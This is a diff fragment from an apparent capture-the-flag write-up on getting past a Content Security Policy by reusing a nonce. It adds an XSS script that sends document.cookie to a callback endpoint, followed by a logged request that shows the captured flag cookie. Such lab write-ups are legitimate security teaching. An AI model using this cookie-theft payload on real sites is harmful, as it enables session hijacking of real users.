@@ -21,5 +21,36 @@ Then, you need to include the same nonce in the <script> element:
 
 https://developer.mozilla.org/en-US/docs...script-src
 
+nonce from the page.
 
+<script nonce=b723e5e13f15b5585d5c63ea17a6dc7a>
+   const inline = 1;
+   fetch('/callback', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ cookies: document.cookie })
+   });
+</script>
+
+Time: 10/26/2024, 5:34:17 PM
+Method: POST
+Headers:
+Host: 127.0.0.1:8000
+Connection: keep-alive
+Content-Length: 88
+User-Agent: HackTheBoo/20.24 (Cursed; StalePolicy) CSPloitCrawler/1.1
+Content-Type: application/json
+Accept: */*
+Origin: http://127.0.0.1:8000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:8000/xss
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: en-US,en;q=0.9
+Cookie: flag=HTB{br0k3_th3_sp3cter's_st4l3_curs3_c5945a2fac847e0d87a00c60ce15cd4d}
+Raw Data:
+{
+  "cookies": "flag=HTB{br0k3_th3_sp3cter's_st4l3_curs3_c5945a2fac847e0d87a00c60ce15cd4d}"
+}
 '''
